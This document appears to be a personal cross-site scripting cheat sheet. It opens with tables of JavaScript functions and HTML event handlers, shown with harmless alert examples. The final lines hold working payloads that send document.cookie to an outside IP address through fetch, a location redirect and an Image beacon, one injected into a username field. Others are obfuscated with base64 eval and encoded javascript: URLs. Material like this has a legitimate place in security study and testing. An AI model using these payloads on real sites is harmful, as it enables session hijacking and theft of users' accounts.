# XSS PAYLOADS

-
# JavaScript XSS Reference

## Execution

| Function | Purpose |
|----------|---------|
| `eval()` | Executes JavaScript code |
| `Function()` | Creates and runs JavaScript functions |
| `setTimeout()` | Executes code after delay |
| `setInterval()` | Executes code repeatedly |

---

## DOM

| Object / Property | Purpose |
|-------------------|---------|
| `document` | Access webpage DOM |
| `document.cookie` | Access cookies |
| `document.URL` | Get current URL |
| `document.body` | Access page body |
| `innerHTML` | Read/write HTML |
| `document.write()` | Write HTML to page |

---

## Network

| Function | Purpose |
|----------|---------|
| `fetch()` | Send HTTP requests |
| `XMLHttpRequest` | Make HTTP requests |
| `navigator.sendBeacon()` | Send background requests |

---

## Browser Objects

| Object | Purpose |
|--------|---------|
| `window` | Browser environment |
| `location` | URL/navigation control |
| `navigator` | Browser information |
| `localStorage` | Browser storage |

---

## Encoding

| Function | Purpose |
|----------|---------|
| `atob()` | Decode Base64 |
| `btoa()` | Encode Base64 |
| `decodeURIComponent()` | Decode URL strings |
| `encodeURIComponent()` | Encode URL strings |

---

## DOM Creation

| Function | Purpose |
|----------|---------|
| `createElement()` | Create HTML elements |
| `appendChild()` | Add elements to DOM |
| `removeChild()` | Remove elements |
# HTML Element Reference

## Auto-Triggered Events

| Element | Common Events | Example |
|----------|---------------|---------|
| `<body>` | `onload` | `<body onload="alert('test')">` |
| `<img>` | `onload`, `onerror` | `<img src="x" onerror="alert('test')">` |
| `<svg>` | `onload` | `<svg onload="alert('test')">` |
| `<iframe>` | `onload` | `<iframe onload="alert('test')">` |
| `<video>` | `onload`, `onerror` | `<video onerror="alert('test')">` |
| `<audio>` | `onload`, `onerror` | `<audio onerror="alert('test')">` |

---

## User Interaction Events

| Element | Common Events | Example |
|----------|---------------|---------|
| `<a>` | `onclick`, `onmouseover` | `<a onclick="alert('test')">Link</a>` |
| `<button>` | `onclick` | `<button onclick="alert('test')">Click</button>` |
| `<div>` | `onclick`, `onmouseover` | `<div onclick="alert('test')">Content</div>` |

---

## Form Events

| Element | Common Events | Example |
|----------|---------------|---------|
| `<input>` | `onfocus`, `onchange` | `<input onfocus="alert('test')">` |
| `<textarea>` | `onfocus`, `onchange` | `<textarea onfocus="alert('test')"></textarea>` |
| `<form>` | `onsubmit` | `<form onsubmit="alert('test')">` |

---

<img src=x onerror="fetch('http://192.168.160.106:8000/test.png')">
<img src=x onerror="window.location='http://192.168.160.106:8000/?cookie='+document.cookie;">
username=<body onload=\"new Image().src='http://192.168.160.106:8080?c='+document.cookie;\">

fetch('http://IP ADDRESS/?c=' + document.cookie)
<svg onload="eval(atob('BASE64 ENCODE PAYLOAD'))">

ENCODED - > base64 playload -> pop up
<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>
